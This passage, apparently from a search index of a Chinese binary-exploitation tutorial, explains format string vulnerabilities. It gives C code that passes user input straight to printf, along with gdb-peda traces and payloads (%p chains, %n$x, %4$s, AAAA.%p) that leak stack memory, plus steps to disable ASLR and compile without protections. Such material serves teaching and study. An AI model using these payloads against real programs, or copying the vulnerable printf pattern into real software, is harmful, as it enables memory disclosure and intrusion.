\"Hello World!\", 233, \"\\n\"); } \u53cd\u6c47\u7f16\u540e\u7684\u4ee3\u7801\u540c\u4e0a\uff0c\u6ca1\u6709\u4efb\u4f55\u533a\u522b\u3002\u6211\u4eec\u4e3b\u8981\u770b\u4e00\u4e0b\u53c2\u6570\u4f20\u9012\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x56557000 --> 0x1efc EBX: 0x56557000 --> 0x1efc ECX: 0xffffd250 --> 0x1 EDX: 0x5655561f (\"%s %d %s %x %x %x %3$s\") ESI: 0xf7f95000 --> 0x1bbd90 EDI: 0x0 EBP: 0xffffd238 --> 0x0 ESP: 0xffffd220 --> 0x5655561f (\"%s %d %s %x %x %x %3$s\") EIP: 0x56555572 (<main+53>: call 0x565553d0 <printf@plt>) EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555569 <main+44>: lea edx,[eax-0x19e1] 0x5655556f <main+50>: push edx 0x56555570 <main+51>: mov ebx,eax => 0x56555572 <main+53>: call 0x565553d0 <printf@plt> 0x56555577 <main+58>: add esp,0x10 0x5655557a <main+61>: nop 0x5655557b <main+62>: lea esp,[ebp-0x8] 0x5655557e <main+65>: pop ecx Guessed arguments: arg[0]: 0x5655561f (\"%s %d %s %x %x %x %3$s\") arg[1]: 0x56555612 (\"Hello World!\") arg[2]: 0xe9 arg[3]: 0x56555610 --> 0x6548000a ('\\n') [------------------------------------stack-------------------------------------] 0000| 0xffffd220 --> 0x5655561f (\"%s %d %s %x %x %x %3$s\") 0004| 0xffffd224 --> 0x56555612 (\"Hello World!\") 0008| 0xffffd228 --> 0xe9 0012| 0xffffd22c --> 0x56555610 --> 0x6548000a ('\\n') 0016| 0xffffd230 --> 0xffffd250 --> 0x1 0020| 0xffffd234 --> 0x0 0024| 0xffffd238 --> 0x0 0028| 0xffffd23c --> 0xf7df1253 (<__libc_start_main+243>: add esp,0x10) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555572 in main () gdb-peda$ c Continuing. Hello World! 233 ffffd250 0 0 [Inferior 1 (process 27480) exited with code 041] \u8fd9\u4e00\u6b21\u6808\u7684\u7ed3\u6784\u548c\u4e0a\u4e00\u6b21\u76f8\u540c\uff0c\u53ea\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\u6709\u53d8\u5316\u3002\u7a0b\u5e8f\u6253\u5370\u51fa\u4e86\u4e03\u4e2a\u503c\uff08\u5305\u62ec\u6362\u884c\uff09\uff0c\u800c\u6211\u4eec\u5176\u5b9e\u53ea\u7ed9\u51fa\u4e86\u524d\u4e09\u4e2a\u503c\u7684\u5185\u5bb9\uff0c\u540e\u9762\u7684\u4e09\u4e2a %x \u6253\u5370\u51fa\u4e86 0xffffd230~0xffffd238 \u6808\u5185\u7684\u6570\u636e\uff0c\u8fd9\u4e9b\u90fd\u4e0d\u662f\u6211\u4eec\u8f93\u5165\u7684\u3002\u800c\u6700\u540e\u4e00\u4e2a\u53c2\u6570 %3$s \u662f\u5bf9 0xffffd22c \u4e2d \\n \u7684\u91cd\u7528\u3002 \u4e0a\u4e00\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u683c\u5f0f\u5b57\u7b26\u4e32\u4e2d\u8981\u6c42\u7684\u53c2\u6570\u4e2a\u6570\u5927\u4e8e\u6211\u4eec\u63d0\u4f9b\u7684\u53c2\u6570\u4e2a\u6570\u3002\u5728\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u7701\u53bb\u4e86\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u540c\u6837\u5b58\u5728\u6f0f\u6d1e\uff1a #include<stdio.h> void main() { char buf[50]; if (fgets(buf, sizeof buf, stdin) == NULL) return; printf(buf); } gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd1fa (\"Hello %x %x %x !\\n\") EBX: 0x56557000 --> 0x1ef8 ECX: 0xffffd1fa (\"Hello %x %x %x !\\n\") EDX: 0xf7f9685c --> 0x0 ESI: 0xf7f95000 --> 0x1bbd90 EDI: 0x0 EBP: 0xffffd238 --> 0x0 ESP: 0xffffd1e0 --> 0xffffd1fa (\"Hello %x %x %x !\\n\") EIP: 0x5655562a (<main+77>: call 0x56555450 <printf@plt>) EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555623 <main+70>: sub esp,0xc 0x56555626 <main+73>: lea eax,[ebp-0x3e] 0x56555629 <main+76>: push eax => 0x5655562a <main+77>: call 0x56555450 <printf@plt> 0x5655562f <main+82>: add esp,0x10 0x56555632 <main+85>: jmp 0x56555635 <main+88> 0x56555634 <main+87>: nop 0x56555635 <main+88>: mov eax,DWORD PTR [ebp-0xc] Guessed arguments: arg[0]: 0xffffd1fa (\"Hello %x %x %x !\\n\") [------------------------------------stack-------------------------------------] 0000| 0xffffd1e0 --> 0xffffd1fa (\"Hello %x %x %x !\\n\") 0004| 0xffffd1e4 --> 0x32 ('2') 0008| 0xffffd1e8 --> 0xf7f95580 --> 0xfbad2288 0012| 0xffffd1ec --> 0x565555f4 (<main+23>: add ebx,0x1a0c) 0016| 0xffffd1f0 --> 0xffffffff 0020| 0xffffd1f4 --> 0xffffd47a (\"/home/firmy/Desktop/RE4B/c.out\") 0024| 0xffffd1f8 --> 0x65485ea0 0028| 0xffffd1fc (\"llo %x %x %x !\\n\") [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x5655562a in main () gdb-peda$ c Continuing. Hello 32 f7f95580 565555f4 ! [Inferior 1 (process 28253) exited normally] \u5982\u679c\u5927\u5bb6\u90fd\u662f\u597d\u5b69\u5b50\uff0c\u8f93\u5165\u6b63\u5e38\u7684\u5b57\u7b26\uff0c\u7a0b\u5e8f\u5c31\u4e0d\u4f1a\u6709\u95ee\u9898\u3002\u7531\u4e8e\u6ca1\u6709\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u5728 buf \u4e2d\u8f93\u5165\u4e00\u4e9b\u8f6c\u6362\u6307\u793a\u7b26\uff0c\u5219 printf() \u4f1a\u628a\u5b83\u5f53\u505a\u683c\u5f0f\u5b57\u7b26\u4e32\u5e76\u89e3\u6790\uff0c\u6f0f\u6d1e\u53d1\u751f\u3002\u4f8b\u5982\u4e0a\u9762\u6f14\u793a\u7684\u6211\u4eec\u8f93\u5165\u4e86 Hello %x %x %x !\\n \uff08\u5176\u4e2d \\n \u662f fgets() \u51fd\u6570\u7ed9\u6211\u4eec\u81ea\u52a8\u52a0\u4e0a\u7684\uff09\uff0c\u8fd9\u65f6\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8f93\u51fa\u6808\u5185\u7684\u6570\u636e\u3002 \u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0c\u5176\u5b9e\u683c\u5f0f\u5b57\u7b26\u4e32\u6f0f\u6d1e\u53d1\u751f\u7684\u6761\u4ef6\u5c31\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\u8981\u6c42\u7684\u53c2\u6570\u548c\u5b9e\u9645\u63d0\u4f9b\u7684\u53c2\u6570\u4e0d\u5339\u914d\u3002\u4e0b\u9762\u6211\u4eec\u8ba8\u8bba\u4e24\u4e2a\u95ee\u9898\uff1a \u4e3a\u4ec0\u4e48\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\uff1f \u56e0\u4e3a printf() \u51fd\u6570\u7684\u53c2\u6570\u88ab\u5b9a\u4e49\u4e3a\u53ef\u53d8\u7684\u3002 \u4e3a\u4e86\u53d1\u73b0\u4e0d\u5339\u914d\u7684\u60c5\u51b5\uff0c\u7f16\u8bd1\u5668\u9700\u8981\u7406\u89e3 printf() \u662f\u600e\u4e48\u5de5\u4f5c\u7684\u548c\u683c\u5f0f\u5b57\u7b26\u4e32\u662f\u4ec0\u4e48\u3002\u7136\u800c\uff0c\u7f16\u8bd1\u5668\u5e76\u4e0d\u77e5\u9053\u8fd9\u4e9b\u3002 \u6709\u65f6\u683c\u5f0f\u5b57\u7b26\u4e32\u5e76\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u5b83\u53ef\u80fd\u5728\u7a0b\u5e8f\u6267\u884c\u4e2d\u52a8\u6001\u751f\u6210\u3002 printf() \u51fd\u6570\u81ea\u5df1\u53ef\u4ee5\u53d1\u73b0\u4e0d\u5339\u914d\u5417\uff1f printf() \u51fd\u6570\u4ece\u6808\u4e2d\u53d6\u51fa\u53c2\u6570\uff0c\u5982\u679c\u5b83\u9700\u8981 3 \u4e2a\uff0c\u90a3\u5b83\u5c31\u53d6\u51fa 3 \u4e2a\u3002\u9664\u975e\u6808\u7684\u8fb9\u754c\u88ab\u6807\u8bb0\u4e86\uff0c\u5426\u5219 printf() \u662f\u4e0d\u4f1a\u77e5\u9053\u5b83\u53d6\u51fa\u7684\u53c2\u6570\u6bd4\u63d0\u4f9b\u7ed9\u5b83\u7684\u53c2\u6570\u591a\u4e86\u3002\u7136\u800c\u5e76\u6ca1\u6709\u8fd9\u6837\u7684\u6807\u8bb0\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u672c\u539f\u7406"},{"location":"Tutorial/Material/Binary%20Exploitation/#_7","text":"\u901a\u8fc7\u63d0\u4f9b\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c31\u80fd\u591f\u63a7\u5236\u683c\u5f0f\u5316\u51fd\u6570\u7684\u884c\u4e3a\u3002\u6f0f\u6d1e\u7684\u5229\u7528\u4e3b\u8981\u6709\u4e0b\u9762\u51e0\u79cd\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"},{"location":"Tutorial/Material/Binary%20Exploitation/#_8","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u901a\u5e38\u8981\u5728\u7a0b\u5e8f\u5d29\u6e83\u65f6\u624d\u4f1a\u88ab\u53d1\u73b0\uff0c\u6240\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u8fdb\u7a0b\u5d29\u6e83\u3002\u5728 Linux \u4e2d\uff0c\u5b58\u53d6\u65e0\u6548\u7684\u6307\u9488\u4f1a\u5f15\u8d77\u8fdb\u7a0b\u6536\u5230 SIGSEGV \u4fe1\u53f7\uff0c\u4ece\u800c\u4f7f\u7a0b\u5e8f\u975e\u6b63\u5e38\u7ec8\u6b62\u5e76\u4ea7\u751f\u6838\u5fc3\u8f6c\u50a8\uff08\u5728 Linux \u57fa\u7840\u7684\u7ae0\u8282\u4e2d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u6838\u5fc3\u8f6c\u50a8\uff09\u3002\u6211\u4eec\u77e5\u9053\u6838\u5fc3\u8f6c\u50a8\u4e2d\u5b58\u50a8\u4e86\u7a0b\u5e8f\u5d29\u6e83\u65f6\u7684\u8bb8\u591a\u91cd\u8981\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u6b63\u662f\u653b\u51fb\u8005\u6240\u9700\u8981\u7684\u3002 \u5229\u7528\u7c7b\u4f3c\u4e0b\u9762\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u5373\u53ef\u89e6\u53d1\u6f0f\u6d1e\uff1a printf(\"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\") \u5bf9\u4e8e\u6bcf\u4e00\u4e2a %s \uff0c printf() \u90fd\u8981\u4ece\u6808\u4e2d\u83b7\u53d6\u4e00\u4e2a\u6570\u5b57\uff0c\u628a\u8be5\u6570\u5b57\u89c6\u4e3a\u4e00\u4e2a\u5730\u5740\uff0c\u7136\u540e\u6253\u5370\u51fa\u5730\u5740\u6307\u5411\u7684\u5185\u5b58\u5185\u5bb9\uff0c\u76f4\u5230\u51fa\u73b0\u4e00\u4e2a NULL \u5b57\u7b26\u3002 \u56e0\u4e3a\u4e0d\u53ef\u80fd\u83b7\u53d6\u7684\u6bcf\u4e00\u4e2a\u6570\u5b57\u90fd\u662f\u5730\u5740\uff0c\u6570\u5b57\u6240\u5bf9\u5e94\u7684\u5185\u5b58\u53ef\u80fd\u5e76\u4e0d\u5b58\u5728\u3002 \u8fd8\u6709\u53ef\u80fd\u83b7\u5f97\u7684\u6570\u5b57\u786e\u5b9e\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u4f46\u662f\u8be5\u5730\u5740\u662f\u88ab\u4fdd\u62a4\u7684\u3002","title":"\u4f7f\u7a0b\u5e8f\u5d29\u6e83"},{"location":"Tutorial/Material/Binary%20Exploitation/#_9","text":"\u4f7f\u7a0b\u5e8f\u5d29\u6e83\u53ea\u662f\u9a8c\u8bc1\u6f0f\u6d1e\u7684\u7b2c\u4e00\u6b65\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u6765\u83b7\u5f97\u5185\u5b58\u7684\u5185\u5bb9\uff0c\u4e3a\u4e0b\u4e00\u6b65\u6f0f\u6d1e\u5229\u7528\u505a\u51c6\u5907\u3002\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4f1a\u6839\u636e\u683c\u5f0f\u5b57\u7b26\u4e32\u4ece\u6808\u4e0a\u53d6\u503c\u3002\u7531\u4e8e\u5728 x86 \u4e0a\u6808\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\uff0c\u800c printf() \u51fd\u6570\u7684\u53c2\u6570\u662f\u4ee5\u9006\u5e8f\u88ab\u538b\u5165\u6808\u7684\uff0c\u6240\u4ee5\u53c2\u6570\u5728\u5185\u5b58\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f\u4e0e\u5728 printf() \u8c03\u7528\u65f6\u51fa\u73b0\u7684\u987a\u5e8f\u662f\u4e00\u81f4\u7684\u3002 \u4e0b\u9762\u7684\u6f14\u793a\u6211\u4eec\u90fd\u4f7f\u7528\u4e0b\u9762\u7684 \u6e90\u7801 \uff1a #include<stdio.h> void main() { char format[128]; int arg1 = 1, arg2 = 0x88888888, arg3 = -1; char arg4[10] = \"ABCD\"; scanf(\"%s\", format); printf(format, arg1, arg2, arg3, arg4); printf(\"\\n\"); } # echo 0 > /proc/sys/kernel/randomize_va_space $ gcc -m32 -fno-stack-protector -no-pie fmt.c \u6211\u4eec\u5148\u8f93\u5165 b main \u8bbe\u7f6e\u65ad\u70b9\uff0c\u4f7f\u7528 n \u5f80\u4e0b\u6267\u884c\uff0c\u5728 call 0x56555460 <__isoc99_scanf@plt> \u5904\u8f93\u5165 %08x.%08x.%08x.%08x.%08x \uff0c\u7136\u540e\u4f7f\u7528 c \u7ee7\u7eed\u6267\u884c\uff0c\u5373\u53ef\u8f93\u51fa\u7ed3\u679c\u3002 gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () gdb-peda$ x/10x $esp 0xffffd550: 0xffffd584 0x00000001 0x88888888 0xffffffff 0xffffd560: 0xffffd57a 0xffffd584 0x56555220 0x565555d7 0xffffd570: 0xf7ffda54 0x00000001 gdb-peda$ c Continuing. 00000001.88888888.ffffffff.ffffd57a.ffffd584 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 0xffffd584 \u7684\u5730\u5740\u51fa\u73b0\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u6070\u597d\u4f4d\u4e8e\u53c2\u6570 arg1 \u3001 arg2 \u3001 arg3 \u3001 arg4 \u4e4b\u524d\u3002\u683c\u5f0f\u5b57\u7b26\u4e32 %08x.%08x.%08x.%08x.%08x \u8868\u793a\u51fd\u6570 printf() \u4ece\u6808\u4e2d\u53d6\u51fa 5 \u4e2a\u53c2\u6570\u5e76\u5c06\u5b83\u4eec\u4ee5 8 \u4f4d\u5341\u516d\u8fdb\u5236\u6570\u7684\u5f62\u5f0f\u663e\u793a\u51fa\u6765\u3002\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u4f7f\u7528\u4e00\u4e2a\u5185\u90e8\u53d8\u91cf\u6765\u6807\u5fd7\u4e0b\u4e00\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u3002\u5f00\u59cb\u65f6\uff0c\u53c2\u6570\u6307\u9488\u6307\u5411\u7b2c\u4e00\u4e2a\u53c2\u6570\uff08 arg1 \uff09\u3002\u968f\u7740\u6bcf\u4e00\u4e2a\u53c2\u6570\u88ab\u76f8\u5e94\u7684\u683c\u5f0f\u89c4\u8303\u6240\u8017\u7528\uff0c\u53c2\u6570\u6307\u9488\u7684\u503c\u4e5f\u6839\u636e\u53c2\u6570\u7684\u957f\u5ea6\u4e0d\u65ad\u9012\u589e\u3002\u5728\u663e\u793a\u5b8c\u5f53\u524d\u6267\u884c\u51fd\u6570\u7684\u5269\u4f59\u81ea\u52a8\u53d8\u91cf\u4e4b\u540e\uff0c printf() \u5c06\u663e\u793a\u5f53\u524d\u6267\u884c\u51fd\u6570\u7684\u6808\u5e27\uff08\u5305\u62ec\u8fd4\u56de\u5730\u5740\u548c\u53c2\u6570\u7b49\uff09\u3002 \u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528 %p.%p.%p.%p.%p \u5f97\u5230\u76f8\u4f3c\u7684\u7ed3\u679c\u3002 gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"%p.%p.%p.%p.%p\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 (\"%p.%p.%p.%p.%p\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"%p.%p.%p.%p.%p\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"%p.%p.%p.%p.%p\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"%p.%p.%p.%p.%p\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () gdb-peda$ c Continuing. 0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584 \u4e0a\u9762\u7684\u65b9\u6cd5\u90fd\u662f\u4f9d\u6b21\u83b7\u5f97\u6808\u4e2d\u7684\u53c2\u6570\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u76f4\u63a5\u83b7\u5f97\u88ab\u6307\u5b9a\u7684\u67d0\u4e2a\u53c2\u6570\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e0b\u9762\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\uff1a %<arg#>$<format> %n$x \u8fd9\u91cc\u7684 n \u8868\u793a\u6808\u4e2d\u683c\u5f0f\u5b57\u7b26\u4e32\u540e\u9762\u7684\u7b2c n \u4e2a\u503c\u3002 gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () gdb-peda$ x/10w $esp 0xffffd550: 0xffffd584 0x00000001 0x88888888 0xffffffff 0xffffd560: 0xffffd57a 0xffffd584 0x56555220 0x565555d7 0xffffd570: 0xf7ffda54 0x00000001 gdb-peda$ c Continuing. ffffffff.00000001.0x88888888.0x88888888.0xffffd57a.0xffffd584.0x56555220 \u8fd9\u91cc\uff0c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u5730\u5740\u4e3a 0xffffd584 \u3002\u6211\u4eec\u901a\u8fc7\u683c\u5f0f\u5b57\u7b26\u4e32 %3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p \u5206\u522b\u83b7\u53d6\u4e86 arg3 \u3001 arg1 \u3001\u4e24\u4e2a arg2 \u3001 arg4 \u548c\u6808\u4e0a\u7d27\u8ddf\u53c2\u6570\u7684\u4e24\u4e2a\u503c\u3002\u53ef\u4ee5\u770b\u5230\u8fd9\u79cd\u65b9\u6cd5\u975e\u5e38\u5f3a\u5927\uff0c\u53ef\u4ee5\u83b7\u5f97\u6808\u4e2d\u4efb\u610f\u7684\u503c\u3002","title":"\u67e5\u770b\u6808\u5185\u5bb9"},{"location":"Tutorial/Material/Binary%20Exploitation/#_10","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u201c\u663e\u793a\u6307\u5b9a\u5730\u5740\u7684\u5185\u5b58\u201d\u7684\u683c\u5f0f\u89c4\u8303\u6765\u67e5\u770b\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u3002\u4f8b\u5982\uff0c\u4f7f\u7528 %s \u663e\u793a\u53c2\u6570\u3000\u6307\u9488\u6240\u6307\u5b9a\u7684\u5730\u5740\u7684\u5185\u5b58\uff0c\u5c06\u5b83\u4f5c\u4e3a\u4e00\u4e2a ASCII \u5b57\u7b26\u4e32\u5904\u7406\uff0c\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u7a7a\u5b57\u7b26\u3002\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u64cd\u7eb5\u8fd9\u4e2a\u53c2\u6570\u6307\u9488\u6307\u5411\u4e00\u4e2a\u7279\u5b9a\u7684\u5730\u5740\uff0c\u90a3\u4e48 %s \u5c31\u4f1a\u8f93\u51fa\u8be5\u4f4d\u7f6e\u7684\u5185\u5b58\u5185\u5bb9\u3002 \u8fd8\u662f\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u6211\u4eec\u8f93\u5165 %4$s \uff0c\u8f93\u51fa\u7684 arg4 \u5c31\u53d8\u6210\u4e86 ABCD \u800c\u4e0d\u662f\u5730\u5740 0xffffd57a \uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"%4$s\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 (\"%4$s\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"%4$s\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"%4$s\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"%4$s\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () gdb-peda$ c Continuing. ABCD \u4e0a\u9762\u7684\u4f8b\u5b50\u53ea\u80fd\u8bfb\u53d6\u6808\u4e2d\u5df2\u6709\u7684\u5185\u5bb9\uff0c\u5982\u679c\u6211\u4eec\u60f3\u83b7\u53d6\u7684\u662f\u4efb\u610f\u7684\u5730\u5740\u7684\u5185\u5bb9\uff0c\u5c31\u9700\u8981\u6211\u4eec\u81ea\u5df1\u5c06\u5730\u5740\u5199\u5165\u5230\u6808\u4e2d\u3002\u6211\u4eec\u8f93\u5165 AAAA.%p \u8fd9\u6837\u7684\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u89c2\u5bdf\u4e00\u4e0b\u6808\u6709\u4ec0\u4e48\u53d8\u5316\u3002 gdb-peda$ python print(\"AAAA\"+\".%p\"*20) AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p ... gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") EBX: 0x56557000 --> 0x1efc ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd550 --> 0xffffd584 